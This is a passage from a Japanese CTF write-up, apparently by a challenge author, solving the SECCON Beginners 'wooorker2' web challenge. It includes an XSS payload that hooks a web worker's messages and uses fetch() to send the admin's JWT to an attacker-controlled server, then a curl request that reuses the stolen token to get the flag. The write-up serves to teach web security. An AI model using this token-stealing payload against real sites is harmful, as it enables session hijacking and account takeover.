</span></span></code></pre></div><p>そこで、XSSにより<code>loginWorker</code>からのJWTを含むメッセージを受信するリスナーを設置することを考えます。</p><p><code>username</code>と<code>password</code>はWorker内で保存されているため、<code>login</code>関数を再度呼び出せばログインすることは可能です。</p><p>以下をクローラーに送信することで<code>loginWorker</code>からのメッセージを受信するリスナーを設置し、<code>login</code>関数を呼び出して、リスナーが受け取った<code>admin</code>のJWTを自身のサーバに送信することができます。</p><pre tabindex=0><code>login?next=javascript:loginWorker.onmessage=function(event){fetch(`[リクエストを受信するサーバ]?token=${event.data.token}`)};login();
</code></pre><p>そして取得したJWTを用いて、<code>https://wooorker2.beginners.seccon.games/#token=[取得したJWT]</code>にアクセスするとflagが得られます。</p><p><img src=/images/posts/44/flag2.png alt=flag2></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl -H <span style=color:#e6db74>&#34;Authorization: Bearer [取得したJWT]&#34;</span> https://wooorker2.beginners.seccon.games/flag   
</span></span><span style=display:flex><span><span style=color:#f92672>{</span><span style=color:#e6db74>&#34;flag&#34;</span>:<span style=color:#e6db74>&#34;ctf4b{x55_50m371m35_m4k35_w0rk3r_vuln3r4bl3}&#34;</span><span style=color:#f92672>}</span>%   
</span></span></code></pre></div><h1 id=おわりに>おわりに</h1><p>wooorker、wooorker2については競技開始後にしばらく502エラーが返される状況が続いたり、クローラーの処理が滞る問題があったりとご迷惑をおかけしました。</p><p>余談: 自分は初めて参加したSECCON Beginners CTFでは一問も解くことができず、悔しすぎて半泣きになっていた思い出があります。</p></section><div class=post-tags></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/melonattacker title=GitHub><i data-feather=github></i></a>
<a class=border></a><a class=soc href=https://x.com/melonattacker title=X><i data-feather=x></i></a>
<a class=border></a></div><div class=footer-info>2025 © yuasa | <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>